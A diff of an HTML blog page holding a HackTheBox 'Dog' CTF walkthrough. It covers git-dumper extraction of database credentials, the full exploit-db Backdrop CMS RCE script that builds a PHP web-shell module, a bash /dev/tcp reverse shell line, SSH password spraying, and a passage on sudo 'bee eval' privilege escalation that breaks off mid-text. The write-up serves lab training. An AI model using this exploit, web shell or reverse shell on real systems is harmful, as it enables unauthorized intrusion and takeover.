@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>HackTheBox - Dog Writeup | 0xblivion.dev</title>
-<meta name="keywords" content="HackTheBox, Backdrop CMS, Web Exploitation, Git Exposure, Remote Code Execution, Privilege Escalation, Linux, CTF, PHP Exploitation, Information Disclosure">
+<meta name="keywords" content="HackTheBox, Hack The Box, HackTheBox Dog Writeup, Backdrop CMS, Web Exploitation, Git Exposure, Remote Code Execution, Privilege Escalation, Linux, CTF, PHP Exploitation, Information Disclosure">
 <meta name="description" content="Overview
 
-This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
+Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
 <meta name="author" content="0xblivion">
-<link rel="canonical" href="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
+<link rel="canonical" href="https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.7bb9e509f32b776e3778b3ea8539776721782bd73f8019534361265046bfd155.css" integrity="sha256-e7nlCfMrd243eLPqhTl3ZyF4K9c/gBlTQ2EmUEa/0VU=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://0xblivion.dev/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xblivion.dev/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xblivion.dev/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xblivion.dev/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xblivion.dev/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
+<link rel="alternate" hreflang="en" href="https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/">
 <noscript>
     <style>
         #theme-toggle,
@@ -29,21 +29,21 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
         }
 
     </style>
-</noscript><meta property="og:url" content="http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/">
+</noscript><meta property="og:url" content="https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/">
   <meta property="og:site_name" content="0xblivion.dev">
   <meta property="og:title" content="HackTheBox - Dog Writeup">
-  <meta property="og:description" content="Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
+  <meta property="og:description" content="Overview Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
   <meta property="og:locale" content="en-us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-03-28T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-28T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-07-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-12T00:00:00+00:00">
     <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Hack the Box">
+    <meta property="article:tag" content="HackTheBox Dog Writeup">
     <meta property="article:tag" content="Backdrop CMS">
     <meta property="article:tag" content="Web Exploitation">
     <meta property="article:tag" content="Git Exposure">
-    <meta property="article:tag" content="Remote Code Execution">
-    <meta property="article:tag" content="Privilege-Escalation">
       <meta property="og:image" content="https://0xblivion.dev/img/favicon.png">
   
   <meta name="author" content="0xblivion">
@@ -64,7 +64,7 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
 <meta name="twitter:title" content="HackTheBox - Dog Writeup">
 <meta name="twitter:description" content="Overview
 
-This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
+Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.">
 
 
 <script type="application/ld+json">
@@ -76,13 +76,13 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
       "@type": "ListItem",
       "position":  1 ,
       "name": "Posts",
-      "item": "http://localhost:1313/posts/"
+      "item": "https://0xblivion.dev/posts/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "HackTheBox - Dog Writeup",
-      "item": "http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/"
+      "item": "https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/"
     }
   ]
 }
@@ -93,29 +93,29 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
   "@type": "BlogPosting",
   "headline": "HackTheBox - Dog Writeup",
   "name": "HackTheBox - Dog Writeup",
-  "description": "Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\n",
+  "description": "Overview Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\n",
   "keywords": [
-    "HackTheBox", "Backdrop CMS", "Web Exploitation", "Git Exposure", "Remote Code Execution", "Privilege Escalation", "Linux", "CTF", "PHP Exploitation", "Information Disclosure"
+    "HackTheBox", "Hack The Box", "HackTheBox Dog Writeup", "Backdrop CMS", "Web Exploitation", "Git Exposure", "Remote Code Execution", "Privilege Escalation", "Linux", "CTF", "PHP Exploitation", "Information Disclosure"
   ],
-  "articleBody": "Overview This box focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\n+ − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract settings.php → DB Creds [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Login as CMS User [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Upload Malicious Module (RCE) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Trigger Web Shell (www-data) [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray SSH Users [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as johncusack [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Run `sudo bee` to Eval PHP [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Gain Root Access TEST ATTACK PATH LANG TO :D 1. Kicking Off with Nmap As always, we start with an nmap scan to see what services are running on the target. 0xblivion@fluffy: ~ root@0xblivion:~# sudo nmap -sVC -oA nmap/dog 10.10.11.58 -vv # Nmap 7.95 scan initiated Wed Jul 2 16:25:44 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/dog -vv 10.10.11.58 Nmap scan report for 10.10.11.58 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-02 16:25:44 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8= | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y= | 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-git: | 10.10.11.58:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... |_http-generator: Backdrop CMS 1 (https://backdropcms.org) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register | /user/password /user/login /user/logout /?q=admin /?q=comment/reply | /?q=filter/tips /?q=node/add /?q=search /?q=user/password |_/?q=user/register /?q=user/login /?q=user/logout |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 2 16:25:53 2025 -- 1 IP address (1 host up) scanned in 9.54 seconds copy From the Nmap output, we observe an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a .git/ directory, indicating a Git repository, and identifies the web application as Backdrop CMS.\n2. Enumeration We’ll run gobuster in the background to discover more directories and files on the web server. 0xblivion@fluffy: ~ root@0xblivion:~# gobuster dir -u http://10.10.11.58/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.58/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /modules (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/modules/] /.php (Status: 403) [Size: 276] /.html (Status: 403) [Size: 276] /themes (Status: 301) [Size: 311] [--\u003e http://10.10.11.58/themes/] /.htm (Status: 403) [Size: 276] /files (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/files/] /sites (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/sites/] /core (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/core/] /.htaccess (Status: 403) [Size: 276] /.phtml (Status: 403) [Size: 276] /layouts (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/layouts/] /.htc (Status: 403) [Size: 276] /.html_var_DE (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /.htpasswd (Status: 403) [Size: 276] /.git (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/.git/] /.html. (Status: 403) [Size: 276] /.html.html (Status: 403) [Size: 276] /.htpasswds (Status: 403) [Size: 276] /.htm. (Status: 403) [Size: 276] /.htmll (Status: 403) [Size: 276] /.phps (Status: 403) [Size: 276] /.html.old (Status: 403) [Size: 276] /.ht (Status: 403) [Size: 276] /.html.bak (Status: 403) [Size: 276] /.htm.htm (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htgroup (Status: 403) [Size: 276] /.html1 (Status: 403) [Size: 276] /.html.LCK (Status: 403) [Size: 276] /.html.printable (Status: 403) [Size: 276] /.htm.LCK (Status: 403) [Size: 276] /.htaccess.bak (Status: 403) [Size: 276] /.html.php (Status: 403) [Size: 276] /.htmls (Status: 403) [Size: 276] /.htx (Status: 403) [Size: 276] /.htlm (Status: 403) [Size: 276] /.htm2 (Status: 403) [Size: 276] /.html- (Status: 403) [Size: 276] /.htuser (Status: 403) [Size: 276] /.htacess (Status: 403) [Size: 276] /.htm.d (Status: 403) [Size: 276] /.htm.html (Status: 403) [Size: 276] /.htm.old (Status: 403) [Size: 276] /.html-1 (Status: 403) [Size: 276] /.html.orig (Status: 403) [Size: 276] /.html.sav (Status: 403) [Size: 276] /.html_ (Status: 403) [Size: 276] /.html_files (Status: 403) [Size: 276] /.htmlpar (Status: 403) [Size: 276] /.htmlprint (Status: 403) [Size: 276] /.hts (Status: 403) [Size: 276] Progress: 63088 / 63089 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan confirms the presence of the .git directory, which was also found by Nmap. Since Backdrop CMS is open-source, we’ll focus on the .git directory for potential information disclosure.\nDumping .git/ using git-dumper We’ll use git-dumper to extract the contents of the .git repository from the web server.\n0xblivion@fluffy: ~ root@0xblivion:~# mkdir git-dump; git-dumper http://10.10.11.58/ git-dump/ [~] Testing http://10.10.11.58/.git/HEAD [200] [~] Testing http://10.10.11.58/.git/ [200] [~] Fetching .git recursively [~] Fetching http://10.10.11.58/.gitignore [404] [~] http://10.10.11.58/.gitignore responded with status code 404 [~] Fetching http://10.10.11.58/.git/ [200] [~] Fetching http://10.10.11.58/.git/objects/ [200] [~] Fetching http://10.10.11.58/.git/HEAD [200] [~] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200] [~] Fetching http://10.10.11.58/.git/config [200] [~] Fetching http://10.10.11.58/.git/branches/ [200] [~] Fetching http://10.10.11.58/.git/hooks/ [200] [~] Fetching http://10.10.11.58/.git/description [200] [~] Fetching http://10.10.11.58/.git/logs/ [200] [~] Fetching http://10.10.11.58/.git/refs/ [200] ...SNIP.. copy DB Password Within the dumped .git repository, we found a settings.php file in the root directory that contains database credentials. 0xblivion@fluffy: ~ root@0xblivion:~# head -n 16 settings.php \u003c?php /** * @file * Main Backdrop CMS configuration file. */ /** * Database configuration: * * Most sites can configure their database by entering the connection string * below. If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; $database_prefix = ''; copy The credentials found are root:BackDropJ2024DS2024.\nWe attempted to log in to the website’s admin panel using these credentials, but root was not a valid username.\nFinding a valid user We used grep to recursively search for strings containing dog.htb within the dumped Git repository, hoping to find valid usernames.\n0xblivion@fluffy: ~ root@0xblivion:~# grep -Ri dog.htb files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \"tiffany@dog.htb\" .git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases .git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases copy We found a potential username: tiffany@dog.htb.\nWe added the domain to our /etc/hosts file for easier access. 0xblivion@fluffy: ~ root@0xblivion:~# echo \"10.10.11.58 dog.htb\" | sudo tee -a /etc/hosts copy Using tiffany as the username and BackDropJ2024DS2024 as the password, we were able to log into the Backdrop CMS admin panel.\n3. Foothold and User flag Now that we have authenticated access to the Backdrop CMS admin panel, we’ll look for a way to gain a shell. We searched for exploits related to “Backdrop CMS” and found an authenticated RCE exploit on exploit-db.\nhttps://www.exploit-db.com/exploits/52021 The exploit script generates a malicious module (shell.zip) that can be uploaded to the CMS.\n#!/usr/bin/env python3 # Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) # Date: 04/27/2024 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://backdropcms.org/ # Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip # Version: latest # Tested on: MacOS import os import time import zipfile def create_files(): info_content = \"\"\" type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 \"\"\" shell_info_path = \"shell/shell.info\" os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörüoluşturur with open(shell_info_path, \"w\") as file: file.write(info_content) shell_content = \"\"\" \u003c?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?\u003e \"\"\" shell_php_path = \"shell/shell.php\" with open(shell_php_path, \"w\") as file: file.write(shell_content) return shell_info_path, shell_php_path def create_zip(info_path, php_path): zip_filename = \"shell.zip\" with zipfile.ZipFile(zip_filename, 'w') as zipf: zipf.write(info_path, arcname='shell/shell.info') zipf.write(php_path, arcname='shell/shell.php') return zip_filename def main(url): print(\"Backdrop CMS 1.27.1 - Remote Command Execution Exploit\") time.sleep(3) print(\"Evil module generating...\") time.sleep(2) info_path, php_path = create_files() zip_filename = create_zip(info_path, php_path) print(\"Evil module generated!\", zip_filename) time.sleep(2) print(\"Go to \" + url + \"/admin/modules/install and upload the \" + zip_filename + \" for Manual Installation.\") time.sleep(2) print(\"Your shell address:\", url + \"/modules/shell/shell.php\") if __name__ == \"__main__\": import sys if len(sys.argv) \u003c 2: print(\"Usage: python script.py [url]\") else: main(sys.argv[1]) Exploit Running the Python script: 0xblivion@fluffy: ~ root@0xblivion:~# ./exploit.py http://10.10.11.58/ Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: http://10.10.11.58//modules/shell/shell.php copy The script instructs us to upload shell.zip via the “Manual Installation” option in the CMS admin panel (http://dog.htb/admin/modules/install).\nFunctionality \u003e Install new modules \u003e Manual Installation\nHowever, the CMS only accepts .tar.gz files for manual installation. We need to compress the shell/ directory generated by the script into a .tar.gz archive.\n0xblivion@fluffy: ~ root@0xblivion:~# tar -czf shell.tar.gz shell/ root@0xblivion:~# ls shell shell.tar.gz shell.zip exploit.py git-dump copy Now, we can upload shell.tar.gz through the “Manual installation” page.\nAfter successful installation, we can access our web shell at http://dog.htb/modules/shell/shell.php\nThe web shell confirms we are running as the www-data user. We’ll use a reverse shell to get a more stable connection.\nbash -c 'bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261' On our attacking machine, we set up a netcat listener: 0xblivion@fluffy: ~ root@0xblivion:~# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.15.7] from (UNKNOWN) [10.10.11.58] 54688 bash: cannot set terminal process group (929): Inappropriate ioctl for device bash: no job control in this shell www-data@dog:/var/www/html/modules/shell$ copy We upgrade the shell to an interactive TTY: 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ script -q /dev/null -c bash copy Then, CTRL+Z to background the shell, followed by stty raw -echo; fg and pressing Enter twice. 0xblivion@fluffy: ~ stty raw -echo; fg [2] - continued nc -lnvp 9001 www-data@dog:/var/www/html/modules/shell$ copy We also adjust the TTY dimensions for better usability:\n0xblivion@fluffy: ~ root@0xblivion:~# stty -a speed 38400 baud; rows 45; columns 238; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = ; eol2 = ; swtch = ; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc copy 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238 copy Actually, you don’t need to do this step since you can just find a user through the webshell. Now that we have a stable shell, we enumerate local users on the system. 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash jobert:x:1000:1000:jobert:/home/jobert:/bin/bash johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash copy We found three users with shell access: root, jobert, and johncusack. We’ll save these usernames to users.txt.\nWe use netexec to spray the database password (BackDropJ2024DS2024) against these users for SSH. 0xblivion@fluffy: ~ root@0xblivion:~# nxc ssh 10.10.11.58 -u users.txt -p 'BackDropJ2024DS2024' --continue-on-success SSH 10.10.11.58 22 10.10.11.58 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12 SSH 10.10.11.58 22 10.10.11.58 [-] jobert:BackDropJ2024DS2024 SSH 10.10.11.58 22 10.10.11.58 [+] johncusack:BackDropJ2024DS2024 Linux - Shell access! copy The johncusack user’s password is BackDropJ2024DS2024. We can now SSH into the box as johncusack.\n0xblivion@fluffy: ~ root@0xblivion:~# ssh johncusack@dog.htb The authenticity of host 'dog.htb (10.10.11.58)' can't be established. ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts. johncusack@dog.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed 02 Jul 2025 09:26:21 PM UTC System load: 0.0 Usage of /: 50.9% of 6.32GB Memory usage: 26% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for eth0: 10.10.11.58 IPv6 address for eth0: dead:beef::250:56ff:feb0:b9d2 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Mar 4 17:04:29 2025 from 10.10.15.7 johncusack@dog:~$ copy We are now logged in as johncusack. We can find the user flag in the home directory. 0xblivion@fluffy: ~ johncusack@dog:~$ ls user.txt johncusack@dog:~$ cat user.txt d305454bc5a53fb01aec080ec3a2ee33 copy User flag: d305454bc5a53fb01aec080ec3a2ee33\n4. Privilege Escalation to Root We check sudo -l to see what commands johncusack can run with sudo privileges.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee copy The user johncusack can execute /usr/local/bin/bee as root. We inspect the bee file.\n0xblivion@fluffy: ~ johncusack@dog:~$ file /usr/local/bin/bee /usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php copy It’s a symbolic link to /backdrop_tool/bee/bee.php. We can view the contents of bee.php:\n#!/usr/bin/env php \u003c?php /** * @file * A command line utility for Backdrop CMS. */ // Exit gracefully with a meaningful message if installed within a web // accessible location and accessed in the browser. if (!bee_is_cli()) { echo bee_browser_load_html(); die(); } // Set custom error handler. set_error_handler('bee_error_handler'); // Include files. require_once __DIR__ . '/includes/miscellaneous.inc'; require_once __DIR__ . '/includes/command.inc'; require_once __DIR__ . '/includes/render.inc'; require_once __DIR__ . '/includes/filesystem.inc'; require_once __DIR__ . '/includes/input.inc'; require_once __DIR__ . '/includes/globals.inc'; // Main execution code. bee_initialize_server(); bee_parse_input(); bee_initialize_console(); bee_process_command(); bee_print_messages(); bee_display_output(); exit(); /** * Custom error handler for `bee`. * * @param int $error_level * The level of the error. * @param string $message * Error message to output to the user. * @param string $filename * The file that the error came from. * @param int $line * The line number the error came from. * @param array $context * An array of all variables from where the error was triggered. * * @see https://www.php.net/manual/en/function.set-error-handler.php * @see _backdrop_error_handler() */ function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) { require_once __DIR__ . '/includes/errors.inc'; _bee_error_handler_real($error_level, $message, $filename, $line, $context); } /** * Detects whether the current script is running in a command-line environment. */ function bee_is_cli() { return (empty($_SERVER['SERVER_SOFTWARE']) \u0026\u0026 (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) \u0026\u0026 $_SERVER['argc'] \u003e 0))); } /** * Return the HTML to display if this page is loaded in the browser. * * @return string * The concatentated html to display. */ function bee_browser_load_html() { // Set the title to use in h1 and title elements. $title = \"Bee Gone!\"; // Place a white block over \"#!/usr/bin/env php\" as this is output before // anything else. $browser_output = \"\u0026nbsp;\"; // Add the bee logo and style appropriately. $browser_output .= \"\"; // Add meaningful text. $browser_output .= \"$title\"; $browser_output .= \"Bee is a command line tool only and will not work in the browser.\n\"; // Add the document title using javascript when the window loads. $browser_output .= \"\"; // Output the combined string. return $browser_output; } We check the bee command’s eval functionality.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo bee help eval eval, ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. Arguments: code The PHP code to evaluate. Examples: bee eval '$node = node_load(1); print $node-\u003etitle;' Loads node with nid 1 and then prints its title. bee eval \"node_access_rebuild();\" Rebuild node access permissions. bee eval \"file_unmanaged_copy('$HOME/Pictures/image.jpg', 'public://image.jpg');\" Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable 